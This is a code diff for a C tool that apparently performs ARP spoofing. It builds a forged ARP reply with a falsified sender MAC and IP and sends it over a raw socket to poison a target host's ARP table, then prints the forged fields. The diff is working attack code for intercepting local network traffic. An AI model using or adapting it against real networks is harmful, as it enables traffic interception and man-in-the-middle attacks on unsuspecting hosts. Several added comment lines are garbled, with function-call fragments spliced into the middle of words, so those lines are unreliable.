@@ -41,9 +41,9 @@ _mc_t_packet    _mc_create_packet_for_spoofing(void)
     // Again, the source MAC is falsly set to the host's MAC address
 	_mc_memcpy(packet.arp_packet.arp_sha, _mc_g_data.host_mac, ETH_ALEN);
     // The sender's IP is falsly set to the former target IP address of the ARP request
-	_mc_memcpy(packet.arp_packet.arp_spa, packet.arp_packet.arp_tpa, ETH_ALEN);
+	_mc_memcpy(packet.arp_packet.arp_spa, packet.arp_packet.arp_tpa, _MC_IPV4_BYTE_SIZE);
     // The target's IP is the one given from the command line
-	_mc_memcpy(packet.arp_packet.arp_tpa, _mc_g_data.target_ip, ETH_ALEN);
+	_mc_memcpy(packet.arp_packet.arp_tpa, _mc_g_data.target_ip, _MC_IPV4_BYTE_SIZE);
 
     return packet;
 }
@@ -52,8 +52,33 @@ void	_mc_run_arp_spoofing(void)
 {
 	_mc_t_packet	packet = _mc_create_packet_for_spoofing();
 
+    /* Send the fake ARP reply using the created packet
+        (Destination port is inside src_addr)
+    */
+    printf(_MC_YELLOW_COLOR
+        "Now sending an ARP reply to the target address with spoofed source..."
+        _MC_RESET_COLOR "\n\n"
+    );
+
+    printf("h_dest: ");_mc_print_mac(packet.ethernet_header.h_dest);
+    // The source MAC is falsly set to the host's MAC address
+	printf("h_src: "); _mc_print_mac(packet.ethernet_header.h_source);
+
+    // The target MAC is replaced by the ARP request's MAC address
+	printf("tha: ");_mc_print_mac(packet.arp_packet.arp_tha);
+    // Again, th;_mc_print_ip(e source MAC is falsly set to the host's MAC addres)s
+	printf("sha: ");_mc_print_mac(packet.arp_packet.arp_sha);
+    // The sende;_mc_print_ip(r's IP is falsly set to the former target IP address of the ARP reques)t
+	printf("spa: ");_mc_print_ip(packet.arp_packet.arp_spa);
+    // The targe;_mc_print_ip(t's IP is the one given from the command lin)e
+	printf("tpa: ");_mc_print_ip(packet.arp_packet.arp_tpa);
+
     int ret = sendto(
         _mc_g_data.raw_sockfd, &packet, sizeof(_mc_t_packet), 0,
         (struct sockaddr *)&_mc_g_data.src_addr, sizeof(struct sockaddr_ll)
     );
+
+    if (ret <= 0) fprintf(stderr, "Failed to send the ARP reply\n");
+    else
+        printf("Sent an ARP reply packet, you may now check the arp table on the target\n");
 }
